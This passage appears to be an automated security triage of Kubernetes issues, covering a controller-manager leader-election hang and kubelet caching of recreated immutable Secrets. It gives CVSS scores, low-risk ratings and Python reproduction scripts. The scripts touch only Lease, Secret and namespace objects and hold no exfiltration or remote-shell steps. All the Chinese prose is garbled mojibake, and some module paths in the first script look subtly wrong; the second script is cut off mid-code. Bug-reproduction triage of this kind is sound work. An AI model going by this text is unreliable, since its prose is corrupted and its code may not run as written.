æ­£å¸¸æƒ…å†µä¸‹ï¼Œå½“leaderæ— æ³•ç»­è®¢ç§Ÿçº¦æ—¶ï¼Œå®ƒåº”è¯¥åœæ­¢æ´»åŠ¨å¹¶é€€å‡ºï¼Œä»¥ä¾¿å…¶ä»–å¤‡ç”¨å®ä¾‹å¯ä»¥ç«äº‰æˆä¸ºæ–°çš„leaderã€‚å¦‚æœç°ä»»leaderâ€œå¡ä½â€äº†â€”â€”æ—¢æ— æ³•å·¥ä½œï¼ˆå› ä¸ºå®ƒæ— æ³•è¿æ¥åˆ°apiserverï¼‰ï¼Œåˆä¸æ”¾å¼ƒé¢†å¯¼æƒâ€”â€”é‚£ä¹ˆå°±ä¸ä¼šæœ‰æ–°çš„leaderè¢«é€‰ä¸¾å‡ºæ¥ã€‚è¿™å°†å¯¼è‡´æ‰€æœ‰ä¾èµ–äºcontroller-managerçš„æ§åˆ¶å™¨ï¼ˆå¦‚ReplicaSet, Deployment, Namespaceæ§åˆ¶å™¨ç­‰ï¼‰å…¨éƒ¨åœæ­¢å·¥ä½œã€‚é›†ç¾¤çš„è‡ªåŠ¨åŒ–è¿ç»´èƒ½åŠ›ï¼Œå¦‚Podçš„è‡ªåŠ¨æ‰©ç¼©å®¹ã€æ•…éšœæ¢å¤ã€æœåŠ¡å‘ç°æ›´æ–°ç­‰éƒ½å°†å¤±æ•ˆã€‚

è¿™å®è´¨ä¸Šæ„æˆäº†ä¸€ç§å¯¹æ§åˆ¶å¹³é¢çš„æ‹’ç»æœåŠ¡ï¼ˆDenial of Service, DoSï¼‰ã€‚æ”»å‡»è€…å¦‚æœèƒ½è®¾æ³•ä¸­æ–­`controller-manager`å’Œ`apiserver`ä¹‹é—´çš„ç½‘ç»œï¼Œå°±å¯èƒ½è§¦å‘è¿™ä¸ªé—®é¢˜ï¼Œå¯¼è‡´æ•´ä¸ªé›†ç¾¤ç®¡ç†åŠŸèƒ½ç˜«ç—ªã€‚

æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼Œæˆ‘ä»¬éœ€è¦è¯„ä¼°è§¦å‘æ­¤DoSæ‰€éœ€çš„æ¡ä»¶ï¼š
1.  æ”»å‡»è€…éœ€è¦æœ‰èƒ½åŠ›åœ¨`kube-controller-manager`çš„Pod/èŠ‚ç‚¹å’Œ`kube-apiserver`çš„Pod/èŠ‚ç‚¹ä¹‹é—´åˆ¶é€ ä¸€ä¸ªå•å‘æˆ–åŒå‘çš„ç½‘ç»œåˆ†åŒºã€‚
2.  è¿™ç§ç½‘ç»œæ“çºµé€šå¸¸éœ€è¦éå¸¸é«˜çš„æƒé™ï¼Œä¾‹å¦‚å¯¹åº•å±‚ç½‘ç»œè®¾æ–½ï¼ˆäº¤æ¢æœºã€è·¯ç”±å™¨ï¼‰ã€äº‘ç¯å¢ƒç½‘ç»œç­–ç•¥ï¼ˆå¦‚å®‰å…¨ç»„ã€NACLsï¼‰æˆ–å®¿ä¸»æœºèŠ‚ç‚¹çš„rootè®¿é—®æƒé™ã€‚

æ ¹æ®CVSS 3.1æ ‡å‡†è¿›è¡Œè¯„ä¼°ï¼š
*   **Attack Vector (AV): Network (N)** - æ”»å‡»å¯ä»¥è¿œç¨‹å‘èµ·ï¼Œä½†éœ€è¦è®¿é—®åˆ°é›†ç¾¤çš„å†…éƒ¨ç½‘ç»œæˆ–ç®¡ç†å¹³é¢ã€‚
*   **Attack Complexity (AC): High (H)** - æ”»å‡»è€…éœ€è¦ç²¾ç¡®åœ°ä¸­æ–­ä¸¤ä¸ªç‰¹å®šç»„ä»¶é—´çš„é€šä¿¡ï¼Œè€Œä¸å½±å“å…¶ä»–ç»„ä»¶ï¼Œè¿™éœ€è¦å¯¹é›†ç¾¤ç¯å¢ƒæœ‰æ·±å…¥äº†è§£å’Œé«˜æƒé™ã€‚
*   **Privileges Required (PR): High (H)** - å¦‚ä¸Šæ‰€è¿°ï¼Œéœ€è¦èŠ‚ç‚¹æˆ–ç½‘ç»œåŸºç¡€è®¾æ–½çš„ç®¡ç†æƒé™ã€‚
*   **User Interaction (UI): None (N)** - æ— éœ€ç”¨æˆ·äº¤äº’ã€‚
*   **Scope (S): Unchanged (U)** - å½±å“èŒƒå›´é™äºKubernetesé›†ç¾¤è‡ªèº«çš„åŠŸèƒ½ï¼Œæœªå‘ç”Ÿæƒé™æˆ–ä½œç”¨åŸŸçš„å˜æ›´ã€‚
*   **Confidentiality (C): None (N)** - ä¸å½±å“æ•°æ®æœºå¯†æ€§ã€‚
*   **Integrity (I): None (N)** - ä¸ç›´æ¥ç ´åæ•°æ®å®Œæ•´æ€§ï¼Œä½†ä¼šé˜»æ­¢çŠ¶æ€æ›´æ–°ã€‚
*   **Availability (A): High (H)** - æ§åˆ¶å¹³é¢çš„æ ¸å¿ƒåŠŸèƒ½ï¼ˆæ§åˆ¶å™¨å¾ªç¯ï¼‰å®Œå…¨ä¸§å¤±å¯ç”¨æ€§ï¼Œå¯¹é›†ç¾¤çš„è¿ç»´é€ æˆä¸¥é‡å½±å“ã€‚

è®¡ç®—å¾—å‡ºCVSS 3.1è¯„åˆ†ä¸º `4.9` (Medium)ã€‚

æ ¹æ®Issueé£é™©åˆ¤æ–­æ ‡å‡†ç¬¬äº”æ¡ï¼šâ€œåœ¨é£é™©ç±»å‹ä¸ºæ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰æ”»å‡»æ—¶ï¼Œå¦‚æœæ”»å‡»è€…éœ€è¦ä¸€å®šæƒé™æ‰èƒ½å¤Ÿå®æ–½è¯¥æ”»å‡»ï¼Œåˆ™è§†æƒ…å†µéœ€è¦é™çº§å¤„ç†...ä¸åº”åˆ¤æ–­ä¸ºé«˜é£é™©â€ã€‚ç”±äºè§¦å‘æ­¤æ¼æ´éœ€è¦å¾ˆé«˜çš„æƒé™ï¼Œå› æ­¤å°½ç®¡å…¶åæœæ˜¯é«˜å¯ç”¨çš„ï¼Œä½†å…¶åˆ©ç”¨é—¨æ§›æé«˜ã€‚å› æ­¤ï¼Œæˆ‘ä»¬å°†æ­¤é£é™©è¯„çº§ä¸º**ä½é£é™©**ã€‚å®ƒæ›´å¤šåœ°è¢«è§†ä¸ºä¸€ä¸ªä¸¥é‡çš„å¯é æ€§/å¼¹æ€§ç¼ºé™·ï¼Œè€Œéå…¸å‹çš„å®‰å…¨æ¼æ´ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
import threading
import time
import uuid
import os
import sys
import logging
from unittest.mock import patch

from kubernetes import config, client
from kubernetes.client.rest import ApiException
from kubernetes.client.leaderelection import LeaderElector
from kubernetes.client.leaderelection.resourcelock import LeaseLock

# é…ç½®æ—¥å¿—è®°å½•
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(threadName)s - %(message)s')

# ä»Issueä¸­è·å–çš„é…ç½®
LEASE_DURATION = 20  # seconds
RENEW_DEADLINE = 15  # seconds
RETRY_PERIOD = 4    # seconds, should be less than RENEW_DEADLINE

# å…¨å±€äº‹ä»¶å’ŒçŠ¶æ€å˜é‡
leader_1_is_leading = threading.Event()
leader_2_is_leading = threading.Event()
stop_event = threading.Event()
lease_name = f"cm-leader-election-poc-{uuid.uuid4().hex[:6]}"
lease_namespace = "kube-system"

def on_start_leading(identity):
    """å½“æˆä¸ºleaderæ—¶è°ƒç”¨çš„å›è°ƒå‡½æ•°"""
    logging.info(f"{identity} has become the leader.")
    if identity == "controller-manager-1":
        leader_1_is_leading.set()
    elif identity == "controller-manager-2":
        leader_2_is_leading.set()

def on_stop_leading(identity):
    """å½“å¤±å»leaderæ—¶è°ƒç”¨çš„å›è°ƒå‡½æ•°"""
    logging.info(f"{identity} has stopped being the leader.")
    if identity == "controller-manager-1":
        leader_1_is_leading.clear()
    elif identity == "controller-manager-2":
        leader_2_is_leading.clear()

def on_new_leader(identity, new_leader_id):
    """å½“è§‚å¯Ÿåˆ°æ–°leaderæ—¶è°ƒç”¨çš„å›è°ƒå‡½æ•°"""
    logging.info(f"{identity} observed a new leader: {new_leader_id}")

def setup_kubernetes_client():
    """åŠ è½½kubeconfigå¹¶è¿”å›apiå®¢æˆ·ç«¯"""
    try:
        config.load_kube_config()
        api_client = client.ApiClient()
        return api_client
    except config.ConfigException:
        logging.error("Could not configure kubernetes client. Is kubeconfig available?")
        sys.exit(1)

def create_lease_object(api_client, name, namespace):
    """åœ¨é›†ç¾¤ä¸­åˆ›å»ºLeaseå¯¹è±¡"""
    coordination_v1_api = client.CoordinationV1Api(api_client)
    lease_body = client.V1Lease(
        api_version="coordination.k8s.io/v1",
        kind="Lease",
        metadata=client.V1ObjectMeta(name=name, namespace=namespace),
        spec=client.V1LeaseSpec()
    )
    try:
        logging.info(f"Creating Lease object '{name}' in namespace '{namespace}'...")
        coordination_v1_api.create_namespaced_lease(namespace, lease_body)
        logging.info("Lease object created successfully.")
    except ApiException as e:
        if e.status == 409: # Already exists
            logging.warning("Lease object already exists. Proceeding.")
        else:
            logging.error(f"Failed to create Lease object: {e}")
            raise

def cleanup_lease_object(api_client, name, namespace):
    """æ¸…ç†Leaseå¯¹è±¡"""
    coordination_v1_api = client.CoordinationV1Api(api_client)
    try:
        logging.info(f"Cleaning up Lease object '{name}'...")
        coordination_v1_api.delete_namespaced_lease(name, namespace)
        logging.info("Lease object deleted.")
    except ApiException as e:
        if e.status == 404:
            logging.warning("Lease object not found for cleanup, might have been deleted already.")
        else:
            logging.error(f"Failed to delete Lease object: {e}")

def run_elector(elector, identity):
    """åœ¨çº¿ç¨‹ä¸­è¿è¡ŒLeaderElector"""
    logging.info(f"Starting leader election for {identity}...")
    try:
        while not stop_event.is_set():
            elector.run()
            if stop_event.is_set():
                break
            time.sleep(1) # Elector.run is blocking, but in case it returns, wait a bit
    except Exception as e:
        logging.error(f"Exception in elector {identity}: {e}", exc_info=True)
    finally:
        logging.info(f"Elector {identity} is shutting down.")

def main():
    """ä¸»æ‰§è¡Œå‡½æ•°"""
    api_client_1 = setup_kubernetes_client()
    api_client_2 = setup_kubernetes_client() # A separate client for the second elector

    try:
        create_lease_object(api_client_1, lease_name, lease_namespace)

        lock_1 = LeaseLock(lease_name, "controller-manager-1", lease_namespace, api_client_1)
        lock_2 = LeaseLock(lease_name, "controller-manager-2", lease_namespace, api_client_2)

        elector_1 = LeaderElector(
            lock_1,
            lease_duration=LEASE_DURATION,
            renew_deadline=RENEW_DEADLINE,
            retry_period=RETRY_PERIOD,
            on_start_leading=lambda: on_start_leading("controller-manager-1"),
            on_stop_leading=lambda: on_stop_leading("controller-manager-1"),
            on_new_leader=lambda new_leader: on_new_leader("controller-manager-1", new_leader)
        )

        elector_2 = LeaderElector(
            lock_2,
            lease_duration=LEASE_DURATION,
            renew_deadline=RENEW_DEADLINE,
            retry_period=RETRY_PERIOD,
            on_start_leading=lambda: on_start_leading("controller-manager-2"),
            on_stop_leading=lambda: on_stop_leading("controller-manager-2"),
            on_new_leader=lambda new_leader: on_new_leader("controller-manager-2", new_leader)
        )

        thread1 = threading.Thread(target=run_elector, args=(elector_1, "controller-manager-1"), name="Elector-1", daemon=True)
        thread2 = threading.Thread(target=run_elector, args=(elector_2, "controller-manager-2"), name="Elector-2", daemon=True)

        thread1.start()
        thread2.start()

        logging.info("Waiting for controller-manager-1 to become leader...")
        if not leader_1_is_leading.wait(timeout=LEASE_DURATION * 2):
            logging.error("Timeout: controller-manager-1 did not become leader.")
            return

        logging.info("--- SIMULATING NETWORK PARTITION for controller-manager-1 ---")
        logging.info(f"Patching API client for controller-manager-1 to fail lease updates for {LEASE_DURATION + 5} seconds.")
        
        original_update = elector_1.lock.client.update
        def failing_update(*args, **kwargs):
            logging.warning("controller-manager-1: FAILED to renew lease (simulated network error)")
            raise ApiException(status=0, reason="Simulated network partition")

        elector_1.lock.client.update = failing_update

        # Wait for a period longer than the lease duration to allow expiration and for elector_2 to take over
        logging.info(f"Waiting {LEASE_DURATION + 5} seconds to observe leader change...")
        time.sleep(LEASE_DURATION + 5)

        logging.info("--- SIMULATION ENDED ---")

        # Check the outcome
        if leader_2_is_leading.is_set():
            logging.info("SUCCESS: controller-manager-2 became the new leader as expected.")
        else:
            logging.error("FAILURE: controller-manager-2 did not become the new leader.")
            logging.error("This may indicate the presence of the bug where the old leader does not get evicted correctly.")

        if leader_1_is_leading.is_set():
            logging.error("FAILURE: controller-manager-1 still thinks it is the leader.")
        else:
            logging.info("SUCCESS: controller-manager-1 correctly identified that it is no longer the leader.")

    finally:
        logging.info("Stopping elector threads...")
        stop_event.set()
        # The elector threads are daemons, but we give them a moment to see the stop event.
        time.sleep(2)
        cleanup_lease_object(api_client_1, lease_name, lease_namespace)
        logging.info("POC script finished.")

# ç›´æ¥æ‰§è¡Œmainå‡½æ•°
main()
```


**è§£é‡Šè¯´æ˜ï¼š**

è¯¥Pythonè„šæœ¬æ—¨åœ¨å¤ç°Issueä¸­æè¿°çš„leaderé€‰ä¸¾é—®é¢˜åœºæ™¯ï¼Œå¹¶éªŒè¯å…¶è¡Œä¸ºæ˜¯å¦ç¬¦åˆé¢„æœŸã€‚

1.  **ç¯å¢ƒè®¾ç½®**:
    *   è„šæœ¬ä½¿ç”¨`kubernetes` Pythonåº“ä¸Kubernetesé›†ç¾¤è¿›è¡Œäº¤äº’ï¼Œå¹¶å‡è®¾`kubeconfig`æ–‡ä»¶ä½äºé»˜è®¤ä½ç½®ã€‚
    *   å®ƒå®šä¹‰äº†ä¸Issueä¸­ç±»ä¼¼çš„ç§Ÿçº¦å‚æ•°ï¼š`LEASE_DURATION` (20ç§’) å’Œ `RENEW_DEADLINE` (15ç§’)ã€‚
    *   ä¸ºäº†éš”ç¦»æµ‹è¯•ï¼Œå®ƒä¼šåœ¨`kube-system`å‘½åç©ºé—´ä¸­åˆ›å»ºä¸€ä¸ªå”¯ä¸€çš„`Lease`å¯¹è±¡ï¼ˆåç§°åŒ…å«éšæœºUUIDï¼‰ï¼Œå¹¶åœ¨è„šæœ¬ç»“æŸæ—¶è‡ªåŠ¨æ¸…ç†è¯¥å¯¹è±¡ã€‚

2.  **æ¨¡æ‹Ÿä¸¤ä¸ªController-Manager**:
    *   è„šæœ¬åˆ›å»ºäº†ä¸¤ä¸ª`LeaderElector`å®ä¾‹ï¼ˆ`elector_1` å’Œ `elector_2`ï¼‰ï¼Œåˆ†åˆ«ä»£è¡¨ä¸¤ä¸ª`controller-manager`å®ä¾‹ï¼ˆ`controller-manager-1` å’Œ `controller-manager-2`ï¼‰ã€‚
    *   è¿™ä¸¤ä¸ªå®ä¾‹åœ¨ä¸åŒçš„çº¿ç¨‹ä¸­è¿è¡Œï¼Œå¹¶ç«äº‰åŒä¸€ä¸ª`Lease`å¯¹è±¡çš„é¢†å¯¼æƒã€‚

3.  **æ¨¡æ‹Ÿç½‘ç»œåˆ†åŒº**:
    *   è„šæœ¬é¦–å…ˆä¼šç­‰å¾…ï¼Œç›´åˆ°`controller-manager-1`æˆåŠŸè·å–é¢†å¯¼æƒã€‚
    *   ä¸€æ—¦`controller-manager-1`æˆä¸ºleaderï¼Œè„šæœ¬ä¼šé€šè¿‡**monkey-patching**çš„æ–¹å¼ï¼ŒåŠ¨æ€æ›¿æ¢å…¶ç”¨äºæ›´æ–°ç§Ÿçº¦çš„å†…éƒ¨APIè°ƒç”¨ã€‚è¢«æ›¿æ¢åçš„å‡½æ•°ä¼šç›´æ¥æŠ›å‡º`ApiException`ï¼Œä»¥æ­¤æ¨¡æ‹Ÿå› ç½‘ç»œé—®é¢˜å¯¼è‡´ç»­çº¦å¤±è´¥çš„åœºæ™¯ã€‚
    *   è¿™ç§æ¨¡æ‹Ÿæ˜¯ç²¾ç¡®ä¸”æ— å®³çš„ï¼Œå› ä¸ºå®ƒåªå½±å“è„šæœ¬å†…çš„å¯¹è±¡ï¼Œè€Œä¸ä¼šçœŸæ­£åœ°æ”¹å˜é›†ç¾¤ç½‘ç»œã€‚

4.  **éªŒè¯ç»“æœ**:
    *   åœ¨æ¨¡æ‹Ÿç½‘ç»œæ•…éšœåï¼Œè„šæœ¬ä¼šç­‰å¾…ä¸€æ®µè¶³å¤Ÿé•¿çš„æ—¶é—´ï¼ˆ`LEASE_DURATION + 5`ç§’ï¼‰ï¼Œè¿™è¶…è¿‡äº†ç§Ÿçº¦çš„æœ‰æ•ˆæœŸã€‚
    *   **é¢„æœŸæ­£å¸¸è¡Œä¸º**: åœ¨æ­¤æœŸé—´ï¼Œ`controller-manager-1`çš„ç§Ÿçº¦ä¼šå› ä¸ºæ— æ³•ç»­è®¢è€Œè¿‡æœŸã€‚`controller-manager-2`åº”è¯¥èƒ½æ£€æµ‹åˆ°è¿™ä¸€ç‚¹ï¼Œå¹¶æˆåŠŸè·å–é¢†å¯¼æƒã€‚åŒæ—¶ï¼Œ`controller-manager-1`åº”è¯¥è°ƒç”¨`on_stop_leading`å›è°ƒï¼Œè¡¨ç¤ºå®ƒå·²ç»æ”¾å¼ƒäº†é¢†å¯¼åœ°ä½ã€‚
    *   **è„šæœ¬æ£€æŸ¥ç‚¹**: è„šæœ¬æœ€åä¼šæ£€æŸ¥`controller-manager-2`æ˜¯å¦æˆä¸ºäº†æ–°çš„leaderï¼Œä»¥åŠ`controller-manager-1`æ˜¯å¦å·²ä¸å†è®¤ä¸ºè‡ªå·±æ˜¯leaderã€‚
    *   å¦‚æœ`controller-manager-2`æˆåŠŸå½“é€‰ï¼Œè€Œ`controller-manager-1`ä¹Ÿæ­£ç¡®åœ°æ”¾å¼ƒäº†é¢†å¯¼æƒï¼Œåˆ™è¯´æ˜leaderé€‰ä¸¾æœºåˆ¶å·¥ä½œæ­£å¸¸ã€‚å¦‚æœ`controller-manager-2`æœªèƒ½æˆä¸ºleaderï¼Œæˆ–è€…`controller-manager-1`ä»ç„¶è®¤ä¸ºè‡ªå·±æ˜¯leaderï¼Œé‚£å°±å¯èƒ½å¤ç°äº†Issueä¸­æè¿°çš„â€œhangä½â€çš„bugã€‚

è¯¥POCé€šè¿‡åœ¨å—æ§ç¯å¢ƒä¸­æ¨¡æ‹Ÿæ ¸å¿ƒåœºæ™¯ï¼Œæœ‰æ•ˆåœ°éªŒè¯äº†leaderé€‰ä¸¾æœºåˆ¶åœ¨é¢å¯¹ç½‘ç»œæ•…éšœæ—¶çš„é²æ£’æ€§ã€‚

---


## Issue #131589 kubelet does not refresh immutable secrets after recreation as documentation says

- Issue é“¾æ¥ï¼š[#131589](https://github.com/kubernetes/kubernetes/issues/131589)

### Issue å†…å®¹

#### What happened?

The docs say this about immutable Secrets
https://kubernetes.io/docs/concepts/configuration/secret/#secret-immutable-create

```
Note:
Once a Secret or ConfigMap is marked as immutable, it is not possible to revert this change nor to mutate the contents of the data field. You can only delete and recreate the Secret. Existing Pods maintain a mount point to the deleted Secret - it is recommended to recreate these pods.
```

However, we're seeing different behavior. After the "delete and recreate" we see a mix of behavior. First off, if we recreate the Secret with new keys. New pods cannot mount these keys, but they can mount previously existing keys. If we add a new key in the newly created Secret (with the same name), we'll get an error like this:

```
Error: couldn't find key FOO in Secret test/mysecret
```

But if we view the Secret with `kubectl` the new key exists. There is also a more difficult to reproduce problem where some pods get old values in the existing keys, and some pods get new values. I think all the symptoms stem from the same issue, which is that the `kubelet` caches the immutable secret forever. The documentation indicates that on Pod create, this would be refreshed, but that does not seem to happen.

Is the documentation incorrect in that the `kubelet` persists the data forever and may never update it?

As a pretty harsh workaround, I recreated nodes in the cluster and these fresh Nodes pulled the updated Secret and values.

#### What did you expect to happen?

After recreating the immutable secret, new pods would be able to access the updated values.

#### How can we reproduce it (as minimally and precisely as possible)?

* Create an immutable Secret
* Start and mount the Secret to a Pod
* Delete the immutable Secret
* Recreate the immutable Secret with new values
* Start and mount the Secret to a new Pod that is scheduled on the same node as the previous Pod


#### Anything else we need to know?

Likely related issue: https://github.com/kubernetes/kubernetes/issues/124701

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.31.0
Kustomize Version: v5.4.2
Server Version: v1.30.10-gke.1070000
```

</details>


#### Cloud provider

<details>
GKE
</details>


#### OS version

<details>

```console
Google COS
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä½é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°äº†Kubernetesä¸­`kubelet`ç»„ä»¶åœ¨å¤„ç†ä¸å¯å˜ï¼ˆimmutableï¼‰Secretæ—¶çš„ä¸€ä¸ªç¼“å­˜é—®é¢˜ã€‚æ ¹æ®Kuberneteså®˜æ–¹æ–‡æ¡£ï¼Œæ›´æ–°ä¸€ä¸ªä¸å¯å˜Secretçš„å”¯ä¸€æ–¹æ³•æ˜¯åˆ é™¤å®ƒç„¶åé‡æ–°åˆ›å»ºã€‚é¢„æœŸè¡Œä¸ºæ˜¯ï¼Œæ–°åˆ›å»ºçš„Podåº”è¯¥èƒ½å¤ŸæŒ‚è½½å¹¶è¯»å–æ–°åˆ›å»ºçš„Secretçš„å†…å®¹ã€‚

ç„¶è€Œï¼Œè¯¥IssueæŠ¥å‘Šçš„å®é™…è¡Œä¸ºæ˜¯ï¼šå½“ä¸€ä¸ªä¸å¯å˜Secretè¢«åˆ é™¤å¹¶ä»¥ç›¸åŒçš„åç§°é‡æ–°åˆ›å»ºï¼ˆä½†å†…å®¹å·²æ›´æ–°ï¼Œä¾‹å¦‚æ·»åŠ äº†æ–°çš„é”®å€¼å¯¹ï¼‰åï¼Œå¦‚æœä¸€ä¸ªæ–°çš„Podè¢«è°ƒåº¦åˆ°ä¹‹å‰è¿è¡Œè¿‡æŒ‚è½½æ—§Secretçš„Podçš„åŒä¸€èŠ‚ç‚¹ä¸Šï¼Œè¿™ä¸ªæ–°Podå°†æ— æ³•è®¿é—®Secretä¸­çš„æ–°é”®ã€‚Podçš„å¯åŠ¨æ—¥å¿—ä¼šæŠ¥å‡º`couldn't find key FOO in Secret...`çš„é”™è¯¯ï¼Œå°½ç®¡ä½¿ç”¨`kubectl`å¯ä»¥æŸ¥çœ‹åˆ°Secretå¯¹è±¡ä¸­ç¡®å®å­˜åœ¨è¿™ä¸ªæ–°çš„é”®ã€‚

è¿™ä¸ªé—®é¢˜çš„æ ¹æœ¬åŸå› åœ¨äºï¼ŒèŠ‚ç‚¹ä¸Šçš„`kubelet`åœ¨ç¬¬ä¸€æ¬¡åŠ è½½ä¸€ä¸ªä¸å¯å˜çš„Secretåï¼Œä¼šå°†å…¶æ°¸ä¹…ç¼“å­˜ã€‚å³ä½¿è¯¥Secretåœ¨etcdä¸­è¢«åˆ é™¤å’Œé‡å»ºï¼Œ`kubelet`ä¹Ÿä¸ä¼šåˆ·æ–°å…¶æœ¬åœ°ç¼“å­˜ã€‚å› æ­¤ï¼Œä»»ä½•åç»­è°ƒåº¦åˆ°è¯¥èŠ‚ç‚¹ä¸Šå¹¶éœ€è¦è¯¥Secretçš„Podï¼Œéƒ½ä¼šä»`kubelet`çš„é™ˆæ—§ç¼“å­˜ä¸­è·å–æ•°æ®ï¼Œå¯¼è‡´æ— æ³•æ‰¾åˆ°æ–°æ·»åŠ çš„é”®æˆ–åªèƒ½è¯»å–åˆ°æ—§çš„å€¼ã€‚

ä»å®‰å…¨è§’åº¦åˆ†æï¼š
1.  **å½±å“ç±»å‹**ï¼šæ­¤é—®é¢˜ä¸»è¦å¯¼è‡´**æ‹’ç»æœåŠ¡ï¼ˆDenial of Serviceï¼‰**å’Œ**é…ç½®ä¸ä¸€è‡´**ã€‚
    *   **æ‹’ç»æœåŠ¡**ï¼šå¦‚æœæ–°éƒ¨ç½²çš„åº”ç”¨ç¨‹åºä¾èµ–äºSecretä¸­æ–°å¢çš„å‡­æ®æˆ–é…ç½®é¡¹ï¼Œç”±äº`kubelet`æ— æ³•æä¾›è¿™äº›æ–°æ•°æ®ï¼ŒPodå°†æ— æ³•å¯åŠ¨ï¼Œå¯¼è‡´åº”ç”¨éƒ¨ç½²å¤±è´¥ã€‚
    *   **é…ç½®ä¸ä¸€è‡´**ï¼šå¦‚æœåªæ˜¯æ›´æ–°äº†ç°æœ‰é”®çš„å€¼ï¼ˆä¾‹å¦‚ï¼Œè½®æ¢å¯†ç æˆ–APIå¯†é’¥ï¼‰ï¼Œæ–°Podå¯èƒ½ä¼šç»§ç»­ä½¿ç”¨æ—§çš„ã€å¯èƒ½å·²å¤±æ•ˆæˆ–ä¸å®‰å…¨çš„å‡­æ®è¿è¡Œï¼Œè¿™ä¼šå½±å“æœåŠ¡çš„æ­£å¸¸åŠŸèƒ½ï¼Œå¹¶å¯èƒ½å¸¦æ¥å®‰å…¨éšæ‚£ï¼Œå°½ç®¡å®ƒæœ¬èº«ä¸æ„æˆä¿¡æ¯æ³„éœ²ã€‚

2.  **æ”»å‡»å‰æ**ï¼šè¦åˆ©ç”¨æ­¤é—®é¢˜ï¼Œæ”»å‡»è€…éœ€è¦æ‹¥æœ‰åœ¨ç‰¹å®šå‘½åç©ºé—´å†…`create`ã€`delete`å’Œ`update` SecretåŠPodçš„æƒé™ã€‚è¿™é€šå¸¸æ˜¯é›†ç¾¤ç®¡ç†å‘˜æˆ–æ‹¥æœ‰è¾ƒé«˜æƒé™çš„å¼€å‘äººå‘˜æ‰å…·å¤‡çš„ã€‚ä¸€ä¸ªä½æƒé™çš„åªè¯»ç”¨æˆ·æ— æ³•è§¦å‘æ­¤æ¼æ´ã€‚

3.  **é£é™©è¯„ä¼°**ï¼šæ ¹æ®CVSS 3.1æ ‡å‡†è¿›è¡Œè¯„ä¼°ï¼š
    *   **æ”»å‡»å‘é‡ (AV): N (ç½‘ç»œ)** - æ”»å‡»è€…é€šè¿‡Kubernetes APIè¿›è¡Œæ“ä½œã€‚
    *   **æ”»å‡»å¤æ‚åº¦ (AC): L (ä½)** - å¤ç°æ­¥éª¤æ¸…æ™°ï¼Œåªéœ€åˆ é™¤ã€é‡å»ºSecretå¹¶éƒ¨ç½²æ–°Podå³å¯ã€‚
    *   **æ‰€éœ€æƒé™ (PR): H (é«˜)** - éœ€è¦ç®¡ç†Secretå’ŒPodçš„æƒé™ï¼Œè¿™æ˜¯ä¸ªé«˜æƒé™æ“ä½œã€‚
    *   **ç”¨æˆ·äº¤äº’ (UI): N (æ— )**ã€‚
    *   **èŒƒå›´ (S): U (ä¸å˜)** - æ¼æ´å½±å“èŒƒå›´å±€é™äºå—å½±å“èŠ‚ç‚¹ä¸Šçš„Podï¼Œæœªå½±å“åˆ°å…¶ä»–ç»„ä»¶ã€‚
    *   **æœºå¯†æ€§ (C): N (æ— )** - æœªå¯¼è‡´æ–°çš„ä¿¡æ¯æ³„éœ²ã€‚
    *   **å®Œæ•´æ€§ (I): L (ä½)** - æ–°Podçš„é…ç½®å®Œæ•´æ€§å—åˆ°ç ´åï¼Œå› ä¸ºå®ƒè·å–äº†è¿‡æ—¶çš„æ•°æ®ã€‚
    *   **å¯ç”¨æ€§ (A): L (ä½)** - å¯¼è‡´æ–°éƒ¨ç½²çš„Podåœ¨ç‰¹å®šèŠ‚ç‚¹ä¸Šæ— æ³•å¯åŠ¨ï¼Œæ„æˆå±€éƒ¨æ‹’ç»æœåŠ¡ã€‚

    ç»¼åˆè¯„åˆ†ä¸º **CVSS 3.1: 3.8 (Low)**ã€‚

4.  **ç»“è®º**ï¼šè¯¥é—®é¢˜å±äºå®‰å…¨æ¼æ´ï¼Œä½†ç”±äºå…¶åˆ©ç”¨éœ€è¦é«˜æƒé™ï¼Œä¸”ä¸»è¦å½±å“æ˜¯å¯ç”¨æ€§ï¼ˆæ‹’ç»æœåŠ¡ï¼‰å’Œé…ç½®ä¸€è‡´æ€§ï¼Œè€Œéä¿¡æ¯æ³„éœ²æˆ–ææƒï¼Œå› æ­¤é£é™©ç­‰çº§è¾ƒä½ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
import time
import base64
import os
import sys
from kubernetes import client, config, watch
from kubernetes.client.rest import ApiException

def main():
    """
    ä¸»æ‰§è¡Œå‡½æ•°ï¼Œç”¨äºå¤ç°Kubeletå¯¹ä¸å¯å˜Secretçš„ç¼“å­˜é—®é¢˜ã€‚
    """
    try:
        # é»˜è®¤ä»~/.kube/configåŠ è½½é…ç½®
        config.load_kube_config()
        core_v1 = client.CoreV1Api()
    except Exception as e:
        print(f"æ— æ³•åŠ è½½Kubernetesé…ç½®ï¼Œè¯·ç¡®ä¿kubeconfigé…ç½®æ­£ç¡®: {e}")
        sys.exit(1)

    namespace = "immutable-secret-poc"
    secret_name = "my-immutable-secret"
    pod1_name = "pod-first"
    pod2_name = "pod-second"
    mount_path = "/etc/secret-volume"
    
    # å®šä¹‰è¶…æ—¶æ—¶é—´
    timeout_seconds = 120
    start_time = time.time()

    print("--- POCå¼€å§‹ ---")
    
    # 1. åˆ›å»ºå‘½åç©ºé—´
    print(f"1. åˆ›å»ºå‘½åç©ºé—´: {namespace}")
    try:
        core_v1.create_namespace(client.V1Namespace(metadata=client.V1ObjectMeta(name=namespace)))
    except ApiException as e:
        if e.status == 409:
            print(f"å‘½åç©ºé—´ '{namespace}' å·²å­˜åœ¨ï¼Œç»§ç»­æ‰§è¡Œã€‚")
        else:
            raise

    # 2. åˆ›å»ºåˆå§‹çš„ä¸å¯å˜Secret
    print("2. åˆ›å»ºåˆå§‹çš„ä¸å¯å˜Secret (key1: value1)")
    secret_v1_data = {"key1": base64.b64encode(b"value1").decode("utf-8")}
    secret_v1 = client.V1Secret(
        api_version="v1",
        kind="Secret",
        metadata=client.V1ObjectMeta(name=secret_name),
        data=secret_v1_data,
        immutable=True,
    )
    try:
